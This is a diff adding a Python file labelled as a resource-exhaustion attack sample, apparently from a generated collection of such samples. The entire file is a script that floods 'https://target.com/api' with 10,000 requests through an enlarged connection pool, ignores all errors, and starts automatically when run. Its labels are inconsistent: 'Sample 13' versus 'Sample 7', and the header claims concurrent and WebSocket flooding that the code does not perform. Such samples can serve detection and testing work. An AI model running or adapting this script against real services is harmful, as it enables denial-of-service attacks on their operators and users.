@@ -1,0 +1,24 @@
+# Resource Exhaustion - Concurrent Attack Sample 13
+# Created: 2026-03-30T22:24:11.730700
+# Type: Connection Flood / Thread Exhaustion / WebSocket Flood
+
+# Connection Pool Exhaustion - Sample 7
+import requests
+from requests.adapters import HTTPAdapter
+from urllib3.util.retry import Retry
+
+def exhaust_connection_pool():
+    session = requests.Session()
+    retry = Retry(total=10, connect=10, read=10)
+    adapter = HTTPAdapter(pool_connections=1000, pool_maxsize=1000, max_retries=retry)
+    session.mount("http://", adapter)
+    session.mount("https://", adapter)
+    
+    url = "https://target.com/api"
+    for i in range(10000):
+        try:
+            session.get(url, timeout=0.1)
+        except:
+            pass
+
+exhaust_connection_pool()
